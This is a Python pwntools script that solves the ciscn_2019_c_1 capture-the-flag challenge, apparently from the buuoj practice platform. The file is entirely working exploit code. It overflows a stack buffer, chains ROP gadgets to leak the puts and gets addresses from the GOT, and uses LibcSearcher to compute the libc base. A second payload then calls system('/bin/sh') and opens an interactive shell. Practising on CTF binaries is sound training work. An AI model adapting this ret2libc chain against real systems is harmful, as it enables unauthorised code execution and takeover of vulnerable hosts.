from pwn import *
from LibcSearcher import *


def ciscn_2019_c_1(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_c_1'):
    context(log_level='debug', arch='amd64', os='linux')
    print('ciscn_2019_c_1 start')
    target = process([file_name])
    # target = remote('node4.buuoj.cn', 27836)
    target_elf = ELF(file_name)
    # gdb.attach(target, 'b *0x0000000000400AE2')

    encrypt_text = p64(target_elf.symbols['encrypt'])
    puts_plt = p64(target_elf.plt['puts'])
    puts_got = p64(target_elf.got['puts'])
    gets_got = p64(target_elf.got['gets'])

    pop_ret_gadget = p64(0x400c83)  # pop rdi ; ret

    print('%s\n\n' % target.recvuntil('Input your choice!\n').decode('utf-8'))
    target.sendline(str(1))

    payload_1 = b'A' * 88
    # puts(&puts_got)
    payload_1 += pop_ret_gadget + puts_got + puts_plt
    # puts(&gets_got)
    payload_1 += pop_ret_gadget + gets_got + puts_plt
    # encrypt()
    payload_1 += encrypt_text

    target.sendline(payload_1)

    target.recvline()
    target.recvline()
    target.recvline()

    puts_ptr = int.from_bytes(target.recvline()[:6], 'little')
    gets_ptr = int.from_bytes(target.recvline()[:6], 'little')

    print(hex(puts_ptr))
    print(hex(gets_ptr))

    searcher = LibcSearcher('puts', puts_ptr)
    searcher.add_condition('gets', gets_ptr)
    libc_base = puts_ptr - searcher.dump('puts')

    system_ptr = p64(libc_base + searcher.dump('system'))
    bin_sh_ptr = p64(libc_base + searcher.dump('str_bin_sh'))

    payload_2 = b'A' * 88
    # puts(&puts_got)
    payload_2 += pop_ret_gadget + puts_got + puts_plt
    # puts(&gets_got)
    payload_2 += pop_ret_gadget + gets_got + puts_plt
    # system('/bin/sh')
    payload_2 += pop_ret_gadget + bin_sh_ptr + system_ptr

    print(hex(int.from_bytes(target.recvline()[:6], 'little')))
    target.sendline(payload_2)

    target.interactive()

    print(target.recvline())

    print('ciscn_2019_c_1 end')


if __name__ == '__main__':
    ciscn_2019_c_1()
